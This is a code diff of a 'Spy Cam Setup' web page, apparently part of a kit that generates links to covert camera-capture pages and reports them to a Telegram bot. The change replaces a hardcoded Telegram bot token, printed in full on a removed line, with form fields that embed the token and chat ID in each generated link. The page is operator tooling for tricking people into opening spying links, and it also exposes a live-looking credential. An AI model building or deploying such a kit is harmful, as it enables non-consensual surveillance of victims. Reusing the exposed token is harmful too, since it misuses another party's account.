@@ -131,6 +131,8 @@
     <img src="Spycode.png" alt="Logo" class="logo" onclick="openLink()" oncontextmenu="return false;">
     <h1>Spy Cam Setup</h1>
     <form id="botForm">
+        <label for="botToken">Bot Token:</label>
+        <input type="text" id="botToken" name="botToken" required>
         <label for="chatId">Chat ID:</label>
         <input type="text" id="chatId" name="chatId" required>
         <br>
@@ -151,21 +153,20 @@
     </div>
 
     <script>
-        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
-
         function generateLink(page, name) {
+            const botToken = document.getElementById('botToken').value;
             const chatId = document.getElementById('chatId').value;
-            if (!chatId) {
-                alert('Please enter a Chat ID.');
+            if (!botToken || !chatId) {
+                alert('Please enter both Bot Token and Chat ID.');
                 return;
             }
             const baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/')); // Get the current directory
-            const link = `${baseUrl}/${page}?chatId=${encodeURIComponent(chatId)}`;
+            const link = `${baseUrl}/${page}?botToken=${encodeURIComponent(botToken)}&chatId=${encodeURIComponent(chatId)}`;
             document.getElementById('linkContainer').innerHTML = `Your ${name} link is: <a href="${link}" target="_blank">${link}</a>`;
-            sendLinkToTelegram(chatId, `Your ${name} link is: ${link}`);
+            sendLinkToTelegram(botToken, chatId, `Your ${name} link is: ${link}`);
         }
 
-        async function sendLinkToTelegram(chatId, message) {
+        async function sendLinkToTelegram(botToken, chatId, message) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
